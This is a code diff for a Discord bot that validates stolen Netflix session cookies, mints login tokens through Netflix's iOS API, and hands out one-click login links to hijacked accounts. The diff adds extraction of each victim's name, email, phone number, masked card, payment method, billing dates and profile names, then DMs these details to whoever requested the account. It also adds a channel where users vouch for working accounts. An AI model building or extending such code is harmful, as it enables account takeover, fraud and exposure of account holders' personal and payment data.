@@ -63,6 +63,7 @@ def _start_fake_server():
 
 _start_fake_server()
 
+
 # ==========================================
 # CHANNEL IDs  (set in .env or Replit Secrets)
 # ==========================================
@@ -79,6 +80,7 @@ BGEN_CHANNEL_ID  = _int_env("BGEN_CHANNEL_ID")
 PGEN_CHANNEL_ID  = _int_env("PGEN_CHANNEL_ID")
 OWNER_ID         = int(os.environ.get("OWNER_ID", "1506365840273047714"))
 TICKET_CHANNEL_ID = 1506405663373525145
+VOUCH_CHANNEL_ID  = 1506405646906425384
 
 # ==========================================
 # 1. SUPABASE CLOUD DATABASE
@@ -254,7 +256,7 @@ def parse_cookie_file(raw: str) -> list[str]:
     return accounts
 
 # ==========================================
-# 3. NETFLIX COOKIE CHECKER
+# 3. NETFLIX COOKIE CHECKER (ENHANCED FULL INFO)
 # ==========================================
 
 def normalize_plan_key(value: str | None) -> str:
@@ -279,48 +281,234 @@ def _extract_graphql_info(text: str) -> dict:
             return {}
         data   = payload.get("data") or {}
         growth = data.get("growthAccount") or {}
+        current_profile = data.get("currentProfile") or {}
         plan   = ((growth.get("currentPlan") or {}).get("plan") or {})
         next_p = ((growth.get("nextPlan") or {}).get("plan") or {})
+        profiles = growth.get("profiles") or []
+        profiles_names = [_decode(p.get("name")) for p in profiles if isinstance(p, dict) and p.get("name")]
+        profiles_str = ", ".join(filter(None, profiles_names)) if profiles_names else None
+        # Email extraction
+        email = None
+        email_verified = None
+        growth_email = (current_profile.get("growthEmail") or {})
+        email_obj = growth_email.get("email") or {}
+        email = _decode(email_obj.get("value") if isinstance(email_obj, dict) else None)
+        email_verified = _decode(growth_email.get("isVerified"))
+        if not email:
+            for prof in profiles:
+                ge = (prof.get("growthEmail") or {})
+                e_obj = ge.get("email") or {}
+                email = _decode(e_obj.get("value") if isinstance(e_obj, dict) else None)
+                if email:
+                    email_verified = _decode(ge.get("isVerified"))
+                    break
+        # Payment
+        payment_methods = growth.get("growthPaymentMethods") or []
+        payment = None
+        card = None
+        if payment_methods and isinstance(payment_methods[0], dict):
+            pm = payment_methods[0]
+            payment_typename = pm.get("__typename", "")
+            if "Card" in payment_typename:
+                payment = "CC"
+                display = _decode(pm.get("displayText"))
+                if display and re.fullmatch(r"\d{4}", display):
+                    card = display
+                else:
+                    card = display
+            else:
+                payment = _decode((pm.get("paymentOptionLogo") or {}).get("paymentOptionLogo"))
+                if not payment:
+                    payment = _decode(pm.get("displayText"))
+        # Phone
+        phone = None
+        local_phone = growth.get("growthLocalizablePhoneNumber") or {}
+        raw_phone = local_phone.get("rawPhoneNumber") or {}
+        phone_digits = _decode(raw_phone.get("phoneNumberDigits") if isinstance(raw_phone, dict) else None)
+        phone_country = _decode(raw_phone.get("countryCode") if isinstance(raw_phone, dict) else None)
+        if phone_digits:
+            phone = normalize_phone_number(phone_digits, phone_country)
+        # Member since, next billing
+        member_since = _decode(growth.get("memberSince"))
+        next_billing = _decode((growth.get("nextBillingDate") or {}).get("localDate"))
+        # Extra member
+        extra_member = None
+        features = []
+        for f in (plan.get("availableFeatures") or []):
+            if isinstance(f, dict) and f.get("type"):
+                features.append(str(f["type"]).upper())
+        if "EXTRA_MEMBER" in features:
+            extra_member = "Yes"
+        # Hold status
+        hold = None
+        hold_meta = growth.get("growthHoldMetadata") or {}
+        if isinstance(hold_meta, dict):
+            for key in ("isUserOnHold", "holdStatus", "isOnHold", "pastDue", "isPastDue"):
+                val = hold_meta.get(key)
+                if val is not None:
+                    hold = _decode(val)
+                    break
+        if hold is None:
+            if normalize_plan_key(_decode(growth.get("membershipStatus"))) == "current_member":
+                hold = "No"
+        # User GUID
+        user_guid = _decode(growth.get("ownerGuid") or current_profile.get("guid"))
+
         return {
+            "accountOwnerName": _decode(current_profile.get("name")),
+            "email": email,
+            "emailVerified": email_verified,
+            "countryOfSignup": _decode(((growth.get("countryOfSignUp") or {}).get("code"))),
+            "plan": _decode(plan.get("name") or next_p.get("name")),
+            "quality": _decode(plan.get("videoQuality")),
+            "maxStreams": _decode(growth.get("maxStreams")),
+            "planPrice": _decode(plan.get("priceDisplay") or plan.get("displayPrice")),
+            "memberSince": member_since,
+            "nextBillingDate": next_billing,
+            "paymentMethodType": payment,
+            "maskedCard": card,
+            "phoneDisplay": phone,
+            "showExtraMemberSection": extra_member,
+            "holdStatus": hold,
+            "profilesDisplay": profiles_str,
+            "userGuid": user_guid,
             "membershipStatus": _decode(growth.get("membershipStatus")),
-            "plan":       _decode(plan.get("name") or next_p.get("name")),
-            "quality":    _decode(plan.get("videoQuality") or next_p.get("videoQuality")),
-            "country":    _decode((growth.get("countryOfSignUp") or {}).get("code")),
-            "maxStreams":  _decode(growth.get("maxStreams")),
         }
     except Exception:
         return {}
 
 def _extract_html_info(text: str) -> dict:
     DOT = re.DOTALL
-    return {
-        "membershipStatus": _rx(text,
-            r'"membershipStatus"\s*:\s*"([^"]+)"',
-        ),
+    info = {
+        "accountOwnerName": _rx(text, r'"firstName"\s*:\s*"([^"]+)"'),
+        "email": _rx(text, r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"'),
+        "countryOfSignup": _rx(text, r'"currentCountry"\s*:\s*"([^"]+)"'),
         "plan": _rx(text,
             r'"MemberPlan"\s*,\s*"fields"\s*:\s*\{\s*"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
-            r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"',
-            r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
-            r'"nextPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
             r'"localizedPlanName"\s*:\s*"([^"]+)"',
-            r'"planName"\s*:\s*"([^"]+)"',
             flags=DOT,
         ),
-        "quality": _rx(text,
-            r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
-            r'"videoQuality"\s*:\s*"([^"]+)"',
-            r'"quality"\s*:\s*"([^"]+)"',
-        ),
-        "country": _rx(text,
-            r'"currentCountry"\s*:\s*"([^"]+)"',
-            r'"countryOfSignup"\s*:\s*"([^"]+)"',
-            r'"countryOfSignUp"\s*:\s*\{\s*"code"\s*:\s*"([^"]+)"',
-        ),
-        "maxStreams": _rx(text,
-            r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,}]+)',
-            r'"maxStreams"\s*:\s*"?([^",}\s]+)"?',
-        ),
+        "quality": _rx(text, r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"'),
+        "maxStreams": _rx(text, r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,}]+)'),
+        "planPrice": _rx(text, r'"formattedPlanPrice"\s*:\s*"([^"]+)"'),
+        "memberSince": _rx(text, r'"memberSince":\s*"([^"]+)"'),
+        "nextBillingDate": _rx(text, r'"nextBillingDate"\s*:\s*"([^"]+)"'),
+        "paymentMethodType": _rx(text, r'"paymentMethod"\s*:\s*"([^"]+)"'),
+        "maskedCard": _rx(text, r'"paymentCardDisplayString"\s*:\s*"([^"]+)"'),
+        "phoneDisplay": _rx(text, r'"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"'),
+        "showExtraMemberSection": _rx(text, r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)'),
+        "holdStatus": _rx(text, r'"holdStatus"\s*:\s*(true|false)'),
+        "emailVerified": _rx(text, r'"emailVerified"\s*:\s*(true|false)'),
+        "membershipStatus": _rx(text, r'"membershipStatus":\s*"([^"]+)"'),
+        "profilesDisplay": _rx(text, r'"profileName"\s*:\s*"([^"]+)"'),  # simplified, will be overwritten if GraphQL present
+        "userGuid": _rx(text, r'"userGuid":\s*"([^"]+)"'),
     }
+    # Normalize boolean-like values
+    for key in ("showExtraMemberSection", "holdStatus", "emailVerified"):
+        val = info.get(key)
+        if val is not None:
+            lowered = val.strip().lower()
+            if lowered in ("true", "yes", "1"):
+                info[key] = "Yes"
+            elif lowered in ("false", "no", "0"):
+                info[key] = "No"
+    return {k: v for k, v in info.items() if v}
+
+def _normalize_boolean(val):
+    if isinstance(val, bool):
+        return "Yes" if val else "No"
+    if isinstance(val, (int, float)):
+        return "Yes" if val == 1 else "No"
+    if isinstance(val, str):
+        lowered = val.strip().lower()
+        if lowered in ("true", "yes", "1"):
+            return "Yes"
+        if lowered in ("false", "no", "0"):
+            return "No"
+    return None
+
+def _format_date(value):
+    if not value:
+        return None
+    # try common patterns
+    for fmt in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%B %d, %Y", "%B %Y"):
+        try:
+            dt = datetime.strptime(value, fmt)
+            return dt.strftime("%B %d, %Y")
+        except:
+            pass
+    # try ISO
+    try:
+        dt = datetime.fromisoformat(value.replace("Z", "+00:00"))
+        return dt.strftime("%B %d, %Y")
+    except:
+        pass
+    return value
+
+def _format_member_since(value):
+    if not value:
+        return None
+    # example: "2017-12-01" -> "December 2017"
+    for fmt in ("%Y-%m-%d", "%Y-%m", "%B %Y"):
+        try:
+            dt = datetime.strptime(value, fmt)
+            return dt.strftime("%B %Y")
+        except:
+            pass
+    return value
+
+def normalize_phone_number(digits, country_code=None):
+    if not digits:
+        return None
+    digits = re.sub(r"\D", "", str(digits))
+    if not digits:
+        return None
+    if str(digits).startswith("+"):
+        return digits
+    # crude: if country is known, add prefix if starts with 0
+    if country_code:
+        country_code = country_code.strip().upper()
+        if country_code == "IN" and digits.startswith("0"):
+            return f"+91{digits[1:]}"
+    return digits
+
+def country_flag(cc: str) -> str:
+    if not cc or len(cc) != 2:
+        return ""
+    return "".join(chr(127397 + ord(c)) for c in cc.upper())
+
+def format_country(value):
+    if not value:
+        return "UNKNOWN"
+    flag = country_flag(value)
+    return f"{value} {flag}".strip()
+
+def _merge_info(graphql: dict, html: dict) -> dict:
+    merged = {}
+    for key in ("accountOwnerName", "email", "countryOfSignup", "plan", "quality",
+                "maxStreams", "planPrice", "memberSince", "nextBillingDate",
+                "paymentMethodType", "maskedCard", "phoneDisplay",
+                "showExtraMemberSection", "holdStatus", "emailVerified",
+                "membershipStatus", "profilesDisplay", "userGuid"):
+        g = graphql.get(key)
+        h = html.get(key)
+        merged[key] = g if g not in (None, "", "null") else h
+    # Post-process
+    if merged.get("maskedCard") and merged.get("paymentMethodType") is None:
+        merged["paymentMethodType"] = "CC"
+    # normalize booleans
+    for k in ("showExtraMemberSection", "holdStatus", "emailVerified"):
+        val = merged.get(k)
+        if val is not None:
+            merged[k] = _normalize_boolean(val)
+    # format dates
+    if merged.get("nextBillingDate"):
+        merged["nextBillingDate"] = _format_date(merged["nextBillingDate"])
+    if merged.get("memberSince"):
+        merged["memberSince"] = _format_member_since(merged["memberSince"])
+    # country flag
+    merged["countryDisplay"] = format_country(merged.get("countryOfSignup"))
+    return merged
 
 _EXTRA_MEMBER_PATTERNS = (
     r"extra\s+on\s+someone.?else.?s\s+plan",
@@ -352,7 +540,9 @@ def _is_subscribed(info: dict) -> bool:
         return True
     if any(tok in status_key for tok in ("hold", "past_due", "payment_retry", "paused", "suspend")):
         return True
-    if info.get("isExtraMember"):
+    if info.get("showExtraMemberSection") == "Yes":
+        return True
+    if any(re.search(p, info.get("raw_text", ""), re.IGNORECASE) for p in _EXTRA_MEMBER_PATTERNS):
         return True
     return False
 
@@ -386,37 +576,37 @@ def check_nf_cookie(cookie_text: str) -> dict:
 
     text = r.text
 
-    info = _extract_graphql_info(text)
+    graphql_info = _extract_graphql_info(text)
     html_info = _extract_html_info(text)
-    for k, v in html_info.items():
-        if v and not info.get(k):
-            info[k] = v
+    info = _merge_info(graphql_info, html_info)
+    info["raw_text"] = text  # needed for extra member detection
 
     if any(re.search(p, text, re.IGNORECASE) for p in _EXTRA_MEMBER_PATTERNS):
-        info["isExtraMember"] = True
+        info["showExtraMemberSection"] = "Yes"
 
-    if not info.get("membershipStatus") and not info.get("isExtraMember"):
+    if not info.get("membershipStatus") and not info.get("showExtraMemberSection"):
         if _is_login_page(r.url, text):
             return {"ok": False, "reason": "Cookie expired (redirected to login)."}
 
-    if _is_subscribed(info):
+    subscribed = _is_subscribed(info)
+    if subscribed:
         nft, nft_err = create_nftoken(cookie_text, attempts=2)
         if not nft:
             return {"ok": False, "reason": f"NFToken failed: {nft_err}"}
         return {
-            "ok":        True,
-            "plan":      info.get("plan") or "Unknown",
-            "quality":   info.get("quality") or "Unknown",
-            "country":   info.get("country") or "Unknown",
+            "ok": True,
+            "plan": info.get("plan", "Unknown"),
+            "quality": info.get("quality", "Unknown"),
+            "country": info.get("countryOfSignup", "Unknown"),
             "maxStreams": info.get("maxStreams"),
-            "status":    info.get("membershipStatus"),
-            "nft":       nft,
+            "status": info.get("membershipStatus"),
+            "nft": nft,
+            "full_info": info,
         }
 
-    if info.get("membershipStatus"):
-        return {"ok": False, "reason": f"No active subscription ({info['membershipStatus']})."}
+    # not subscribed but may still have some info
+    return {"ok": False, "reason": f"No active subscription ({info.get('membershipStatus', 'unknown')})."}
 
-    return {"ok": False, "reason": "Cookie dead or session expired."}
 
 _PREMIUM_PLAN_KEYS = {
     "premium", "premium_extra_member", "extra_member_premium",
@@ -432,18 +622,14 @@ _BOOSTER_PLAN_KEYS = {
 def classify_tier(plan: str, quality: str) -> str:
     key_p = normalize_plan_key(plan or "")
     q_up  = (quality or "").upper()
-
     if q_up in ("UHD", "4K") or "UHD" in q_up or "4K" in q_up:
         return "premium"
-
     if key_p in _PREMIUM_PLAN_KEYS or "premium" in key_p:
         return "premium"
     if key_p in _BOOSTER_PLAN_KEYS or "standard" in key_p:
         return "booster"
-
     if q_up == "HIGH" or "1080" in q_up or "FHD" in q_up:
         return "booster"
-
     return "free"
 
 def extract_cookies_from_zip(zip_bytes: bytes) -> tuple[list[str], list[str]]:
@@ -480,7 +666,6 @@ def extract_cookies_from_zip(zip_bytes: bytes) -> tuple[list[str], list[str]]:
 # ==========================================
 
 _NF_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
-
 _NF_PARAMS = {
     "appVersion": "15.48.1",
     "device_type": "NFAPPL-02-",
@@ -491,7 +676,6 @@ _NF_PARAMS = {
     "path": '["account","token","default"]', "pathFormat": "graph",
     "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json",
 }
-
 _NF_HEADERS = {
     "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
     "x-netflix.request.attempt": "1",
@@ -573,13 +757,10 @@ def create_nftoken(cookie_text: str, attempts: int = 3) -> tuple[dict | None, st
     return None, last_err
 
 def build_links_for_tier(token: str, tier: str) -> list[tuple[str, str]]:
-    """Return appropriate login links based on account tier."""
     t = _decode(token)
     if not t:
         return []
-    links = []
-    # PC link always available for all tiers
-    links.append(("🖥️ PC Login", f"https://netflix.com/?nftoken={t}"))
+    links = [("🖥️ PC Login", f"https://netflix.com/?nftoken={t}")]
     if tier in ("booster", "premium"):
         links.append(("📱 Mobile Login", f"https://netflix.com/unsupported?nftoken={t}"))
     if tier == "premium":
@@ -587,7 +768,27 @@ def build_links_for_tier(token: str, tier: str) -> list[tuple[str, str]]:
     return links
 
 # ==========================================
-# 5. LOGIN BUTTON VIEW
+# 5. OWNER-BYPASS COOLDOWN
+# ==========================================
+
+from discord.app_commands import checks
+
+def owner_bypass_cooldown(rate: int, per: float, owner_id: int):
+    mapping = checks.CooldownMapping(checks.Cooldown(rate, per, checks.CooldownType.user))
+
+    async def predicate(interaction: discord.Interaction) -> bool:
+        if interaction.user.id == owner_id:
+            return True
+        bucket = mapping.get_bucket(interaction)
+        retry_after = bucket.update_rate_limit()
+        if retry_after:
+            raise app_commands.CommandOnCooldown(bucket, retry_after)
+        return True
+
+    return app_commands.check(predicate)
+
+# ==========================================
+# 6. LOGIN BUTTON VIEW
 # ==========================================
 
 class LoginView(discord.ui.View):
@@ -597,7 +798,7 @@ class LoginView(discord.ui.View):
             self.add_item(discord.ui.Button(label=label, url=url, style=discord.ButtonStyle.link))
 
 # ==========================================
-# 6. CHANNEL GUARD
+# 7. CHANNEL GUARD
 # ==========================================
 
 def in_channel(channel_id: int):
@@ -610,7 +811,7 @@ def in_channel(channel_id: int):
     return app_commands.check(predicate)
 
 # ==========================================
-# 7. GENERATOR COG
+# 8. GENERATOR COG
 # ==========================================
 
 class GeneratorCog(commands.Cog):
@@ -650,35 +851,87 @@ class GeneratorCog(commands.Cog):
                 continue
 
             links = build_links_for_tier(nft["token"], tier)
+            full_info = check.get("full_info", {})
 
-            # Ephemeral embed with buttons (only visible to user)
-            embed = discord.Embed(
-                title=f"{emoji} {label} Netflix — Generated!",
+            # Build the detailed DM embed
+            dm_embed = discord.Embed(
+                title=f"{emoji} {label} Netflix Account",
                 color=discord.Color.red(),
             )
-            embed.add_field(name="📋 Plan",       value=check.get("plan", "Unknown"),        inline=True)
-            embed.add_field(name="🎬 Quality",    value=(check.get("quality") or "").title(), inline=True)
-            embed.add_field(name="🌍 Country",    value=check.get("country", "Unknown"),     inline=True)
+            dm_embed.add_field(name="📌 Status",     value="Subscribed", inline=True)
+            if full_info.get("accountOwnerName"):
+                dm_embed.add_field(name="👤 Name", value=full_info["accountOwnerName"], inline=True)
+            if full_info.get("email"):
+                dm_embed.add_field(name="📧 Email", value=full_info["email"], inline=True)
+            if full_info.get("countryDisplay"):
+                dm_embed.add_field(name="🌍 Country", value=full_info["countryDisplay"], inline=True)
+            dm_embed.add_field(name="📦 Plan",       value=check.get("plan", "Unknown"), inline=True)
+            if full_info.get("memberSince"):
+                dm_embed.add_field(name="📅 Member Since", value=full_info["memberSince"], inline=True)
+            if full_info.get("nextBillingDate"):
+                dm_embed.add_field(name="🗓️ Next Billing", value=full_info["nextBillingDate"], inline=True)
+            if full_info.get("paymentMethodType"):
+                dm_embed.add_field(name="💳 Payment", value=full_info["paymentMethodType"], inline=True)
+            if full_info.get("maskedCard"):
+                dm_embed.add_field(name="💳 Card", value=full_info["maskedCard"], inline=True)
+            if full_info.get("phoneDisplay"):
+                dm_embed.add_field(name="📱 Phone", value=full_info["phoneDisplay"], inline=True)
+            dm_embed.add_field(name="🎞️ Quality",    value=(check.get("quality") or "").title(), inline=True)
             if check.get("maxStreams"):
-                embed.add_field(name="📺 Streams", value=check["maxStreams"], inline=True)
+                dm_embed.add_field(name="📺 Streams", value=check["maxStreams"], inline=True)
+            if full_info.get("planPrice"):
+                dm_embed.add_field(name="💰 Price", value=full_info["planPrice"], inline=True)
+            if full_info.get("holdStatus"):
+                dm_embed.add_field(name="⏸️ Hold Status", value=full_info["holdStatus"], inline=True)
+            if full_info.get("showExtraMemberSection"):
+                dm_embed.add_field(name="👥 Extra Member", value=full_info["showExtraMemberSection"], inline=True)
+            if full_info.get("emailVerified"):
+                dm_embed.add_field(name="✅ Email Verified", value=full_info["emailVerified"], inline=True)
             if check.get("status"):
-                embed.add_field(name="📌 Status", value=check["status"].replace("_", " ").title(), inline=True)
+                dm_embed.add_field(name="🛡️ Membership Status", value=check["status"].replace("_", " ").title(), inline=True)
+            if full_info.get("profilesDisplay"):
+                profile_count = len(full_info["profilesDisplay"].split(", "))
+                dm_embed.add_field(name=f"🎭 Profiles ({profile_count})", value=full_info["profilesDisplay"], inline=False)
+
+            dm_embed.set_footer(text=f"{label} by INFOGAMER | Vouch in <#{VOUCH_CHANNEL_ID}>")
 
             view = LoginView(links)
-            embed.set_footer(text=f"Token expires: {nft.get('expires_at_utc', 'Unknown')} | Links are one‑time use")
 
-            await interaction.followup.send(embed=embed, view=view, ephemeral=True)
+            # Send DM to user
+            try:
+                await interaction.user.send(embed=dm_embed, view=view)
+                dm_success = True
+            except discord.Forbidden:
+                dm_success = False
 
-            # Public success embed (visible to everyone)
+            # Ephemeral response (fallback if DM blocked)
+            if not dm_success:
+                await interaction.followup.send(
+                    "❌ I couldn't send you a DM. Please enable DMs and try again.",
+                    ephemeral=True,
+                )
+                return
+
+            # Ephemeral success embed (short version)
+            ephemeral_embed = discord.Embed(
+                title=f"{emoji} {label} Netflix Generated!",
+                description=f"Account details have been sent to your DMs. Check your DM for login links.",
+                color=discord.Color.green(),
+            )
+            ephemeral_embed.set_footer(text=f"Expires: {nft.get('expires_at_utc', 'Unknown')} | One‑time use")
+            await interaction.followup.send(embed=ephemeral_embed, ephemeral=True)
+
+            # Public success embed
             public_embed = discord.Embed(
                 title="🎉 Netflix Account Generated!",
                 description=(
-                    f"A **{label}** Netflix account has been generated. "
-                    f"Please check the private message above for your login links.\n\n"
+                    f"{interaction.user.mention} generated a **{label}** Netflix account.\n"
+                    f"Please check your DMs for login links.\n\n"
                     f"**Login Guide:**\n"
                     f"• Click the button matching your device.\n"
                     f"• The link is one‑time use – open it immediately.\n"
-                    f"• If you encounter issues, create a ticket in <#{TICKET_CHANNEL_ID}>."
+                    f"• If you encounter issues, create a ticket in <#{TICKET_CHANNEL_ID}>.\n\n"
+                    f"**Please vouch in <#{VOUCH_CHANNEL_ID}>** if you received a working account!"
                 ),
                 color=discord.Color.green(),
             )
@@ -690,22 +943,21 @@ class GeneratorCog(commands.Cog):
             ephemeral=True,
         )
 
-    # ── generation commands with owner bypass via dynamic key ──
     @app_commands.command(name="fgen", description="🆓 Generate a Free Netflix account")
     @in_channel(FGEN_CHANNEL_ID)
-    @app_commands.checks.cooldown(1, 86400, key=lambda i: i.user.id if i.user.id != OWNER_ID else object())
+    @owner_bypass_cooldown(1, 86400, OWNER_ID)
     async def fgen(self, interaction: discord.Interaction):
         await self._generate(interaction, "free", "Free", "🆓")
 
     @app_commands.command(name="bgen", description="🚀 Generate a Booster Netflix account")
     @in_channel(BGEN_CHANNEL_ID)
-    @app_commands.checks.cooldown(1, 28800, key=lambda i: i.user.id if i.user.id != OWNER_ID else object())
+    @owner_bypass_cooldown(1, 28800, OWNER_ID)
     async def bgen(self, interaction: discord.Interaction):
         await self._generate(interaction, "booster", "Booster", "🚀")
 
     @app_commands.command(name="pgen", description="💎 Generate a Premium Netflix account")
     @in_channel(PGEN_CHANNEL_ID)
-    @app_commands.checks.cooldown(1, 21600, key=lambda i: i.user.id if i.user.id != OWNER_ID else object())
+    @owner_bypass_cooldown(1, 21600, OWNER_ID)
     async def pgen(self, interaction: discord.Interaction):
         await self._generate(interaction, "premium", "Premium", "💎")
 
@@ -843,7 +1095,7 @@ class GeneratorCog(commands.Cog):
         await interaction.followup.send(embed=embed, ephemeral=True)
 
 # ==========================================
-# 8. BOT CLASS
+# 9. BOT CLASS
 # ==========================================
 
 class NetflixBot(commands.Bot):
@@ -927,7 +1179,7 @@ class NetflixBot(commands.Bot):
             await reply_embed(emb)
 
 # ==========================================
-# 9. ENTRY POINT
+# 10. ENTRY POINT
 # ==========================================
 
 def main():
